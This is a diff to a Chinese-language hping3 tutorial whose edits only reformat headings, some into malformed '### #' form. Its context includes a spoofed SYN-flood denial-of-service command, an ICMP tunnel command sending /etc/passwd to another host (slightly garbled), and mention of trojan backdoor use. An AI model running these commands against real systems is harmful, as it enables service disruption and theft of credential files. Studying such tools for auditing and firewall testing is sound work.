@@ -7,7 +7,7 @@ hping3
 
 **hping** 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。
 
-### 安装  
+###  安装
 
 ```shell
 yum install libpcap-devel tc-devel
@@ -20,7 +20,7 @@ make
 make install
 ```
 
-### 选项  
+###  选项
 
 ```shell
 -H --help 显示帮助。
@@ -69,11 +69,11 @@ make install
 -Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。
 ```
 
-### Hping3功能  
+###  Hping3功能
 
 Hping3主要有以下典型功能应用：
 
-####  防火墙测试  
+### #  防火墙测试
 
 使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html
 
@@ -83,7 +83,7 @@ Hping3主要有以下典型功能应用：
 hping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10
 ```
 
-#### 端口扫描  
+### # 端口扫描
 
 Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：
 
@@ -95,13 +95,13 @@ hping3 -I eth0  -S 192.168.10.1 -p 80
 
 hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。
 
-#### Idle扫描  
+### # Idle扫描
 
 Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。
 
 该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。
 
-#### 拒绝服务攻击  
+### # 拒绝服务攻击
 
 使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。
 
@@ -111,7 +111,7 @@ hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
 
 其他攻击如smurf、teardrop、land attack等也很容易构建出来。
 
-#### 文件传输  
+### # 文件传输
 
 Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：
 
@@ -129,7 +129,7 @@ hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
 
 将`/etc/passwd`密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。
 
-#### 木马功能  
+### # 木马功能
 
 如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。
 
